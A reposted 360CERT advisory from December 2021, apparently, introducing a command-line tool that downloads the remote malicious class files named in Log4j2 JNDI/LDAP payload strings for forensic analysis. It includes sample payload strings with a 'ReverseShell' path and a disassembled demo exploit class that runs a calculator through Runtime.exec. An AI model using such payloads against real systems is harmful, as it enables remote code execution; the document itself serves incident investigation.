
---
title: '360CERT 发布 Log4j2 恶意荷载批量检测调查工具'
categories: 
 - 编程
 - 开源中国
 - 资讯
headimg: 'https://picsum.photos/400/300?random=6721'
author: 开源中国
comments: false
date: Wed, 15 Dec 2021 19:12:00 GMT
thumbnail: 'https://picsum.photos/400/300?random=6721'
---

<div>   
<div class="content">
                                                                    
                                                        <p style="color:#333333; margin-left:0; margin-right:0; text-align:justify">报告编号：B6-2021-121502</p> 
<p style="color:#333333; margin-left:0; margin-right:0; text-align:justify">报告来源：360CERT</p> 
<p style="color:#333333; margin-left:0; margin-right:0; text-align:justify">报告作者：360CERT</p> 
<p style="color:#333333; margin-left:0; margin-right:0; text-align:justify">更新日期：2021-12-15</p> 
<h2>简介</h2> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify">近日，Log4j2漏洞在互联网上呈现爆发性的攻击利用态势，黑客通过发送一条JNDI字符串荷载即可控制目标设备。据统计，该漏洞影响6万+流行开源软件，影响70%以上的企业线上业务系统，安全人员针对此类漏洞攻击情况的调查分析取证需要付出极大的精力。为此，360CERT根据实战攻防经验，特别为业界的安全人员研发了一款Log4j2恶意荷载分析工具，希望能够帮助安全人员减轻负担，提升调查响应效率！</p> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify">命令行工具批量下载ldap字符串荷载包含的远程恶意class文件，class文件可进行进一步的分析调查取证。</p> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify">目前只支持 ldap 链接的 class 下载，会下载到<code>payloads/&#123;host&#125;/&#123;uuid&#125;.class</code></p> 
<pre><code>http://pub-shbt.s3.360.cn/cert-public-file/log4j-dl-darwin-amd64
http://pub-shbt.s3.360.cn/cert-public-file/log4j-dl-linux-386
http://pub-shbt.s3.360.cn/cert-public-file/log4j-dl-linux-amd64
http://pub-shbt.s3.360.cn/cert-public-file/log4j-dl-windows-386.exe
http://pub-shbt.s3.360.cn/cert-public-file/log4j-dl-windows-amd64.exe</code></pre> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify">文件 md5</p> 
<pre><code>b0e20c5bf4a8e027cfb6e6ca85fd82fc  log4j-dl-darwin-amd64
0ad55c116bfd75ee33f99830d153e874  log4j-dl-linux-386
3f56dbdbd7c9840481dae17667d5acd5  log4j-dl-linux-amd64
28b881491ed0487b0d64c908a600a350  log4j-dl-windows-386.exe
466d70eea544a8e0212adb0d7a3ab212  log4j-dl-windows-amd64.exe</code></pre> 
<h2>使用</h2> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify">以 linux x64 为例</p> 
<pre style="margin-left:0; margin-right:0; text-align:start">log4j-dl-linux-amd64 -t "ldap://127.0.0.1:233/Basic/ReverseShell/127.0.0.1/9999"

log4j-dl-linux-amd64 -f 1.txt

# 文件内容
cat 1.txt
ldap://127.0.0.1:233/Basic/ReverseShell/127.0.0.1/9999
ldap://127.0.0.1:234/1195197842/asd
</pre> 
<h3 style="margin-left:0; margin-right:0; text-align:justify">完整演示</h3> 
<pre style="margin-left:0; margin-right:0; text-align:start">./log4j-dl-linux-amd64 -t "ldap://192.168.55.102:10001/Exp"
  ____      __     ___     _____   ______   _____    _______
 |___ \    / /    / _ \   / ____| |  ____| |  __ \  |__   __|
   __) |  / /_   | | | | | |      | |__    | |__) |    | |
  |__ <  | '_ \  | | | | | |      |  __|   |  _  /     | |
  ___) | | (_) | | |_| | | |____  | |____  | | \ \     | |
 |____/   \___/   \___/   \_____| |______| |_|  \_\    |_|
http://192.168.55.102:10000/Exp.class
2021/12/15 18:23:40 dump 'a72986b3-aa43-42a2-841b-7b25e2e40140.class'
</pre> 
<pre style="margin-left:0; margin-right:0; text-align:start">javap -c ./payloads/192.168.55.102/a72986b3-aa43-42a2-841b-7b25e2e40140.class
Compiled from "Exp.java"
public class Exp &#123;
  public Exp();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  static &#123;&#125;;
    Code:
       0: iconst_3
       1: anewarray     #2                  // class java/lang/String
       4: dup
       5: iconst_0
       6: ldc           #3                  // String bash
       8: aastore
       9: dup
      10: iconst_1
      11: ldc           #4                  // String -c
      13: aastore
      14: dup
      15: iconst_2
      16: ldc           #5                  // String gnome-calculator
      18: aastore
      19: astore_0
      20: invokestatic  #6                  // Method java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;
      23: aload_0
      24: invokevirtual #7                  // Method java/lang/Runtime.exec:([Ljava/lang/String;)Ljava/lang/Process;
      27: invokevirtual #8                  // Method java/lang/Process.waitFor:()I
      30: pop
      31: goto          39
      34: astore_0
      35: aload_0
      36: invokevirtual #10                 // Method java/lang/Exception.printStackTrace:()V
      39: return
    Exception table:
       from    to  target type
           0    31    34   Class java/lang/Exception
&#125;
</pre> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify">可以完整的看到该恶意 Class 在通过<code>java.lang.Runtime.exec</code>执行<code>gnome-calculator</code></p> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify"><strong>演示地址：</strong></p> 
<p style="color:#6b6870; margin-left:0; margin-right:0; text-align:justify"><em>https://asciinema.org/a/mkcOuClRBpKwDStjx48pxknKb</em></p> 
<p> </p>
                                        </div>
                                      
</div>
            